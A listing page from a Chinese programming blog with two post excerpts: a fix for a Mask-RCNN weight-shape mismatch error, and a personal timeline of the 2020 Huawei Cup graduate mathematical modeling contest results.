	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/427900d34f55682a0a1d0a2f43b2dd57/" rel="bookmark">
			Mask-RCNN出现的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		出现问题：
ValueError: Dimension 1 in both shapes must be equal, but are 28 and 324. Shapes are [1024,28] and [1024,324]. for ‘Assign_682’ (op: ‘Assign’) with input shapes: [1024,28], [1024,324].
这是由于维度的原因不同所造成。
修改了train.py 的第60行
成功！
如果还未成功，看几个地方是否一样：
1 train.py的 num_classes,
2 model_data 的shape_classes
3. h5文件是否修改。train.py的60行和
4. mask_rcnn中的第18行
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f6a0f70a028cb4b73fa7f1353c1013f/" rel="bookmark">
			2020年华为杯中国研究生数学建模时间线
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		颁奖大会以及数模之星答辩的消息，因为疫情原因推迟到了4月底，还有就是现在参赛规则必须是3人组队了，以后看不到一人或者二人拿奖的大佬了
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=分割线=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
最新更新：结果出来了，有幸一等奖，硕博期间圆满了
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=分割线=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
等呀等，问了官方，消息改来改去，静候佳音吧
上图是第一次询问。
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=分割线=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
上图是第二次询问。
建模官方公众号发了评审会的新闻后，又问了一下(13-15号为评审)，预计是23或者24号吧。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/158/">«</a>
	<span class="pagination__item pagination__item--current">159/220</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/160/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程中国的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>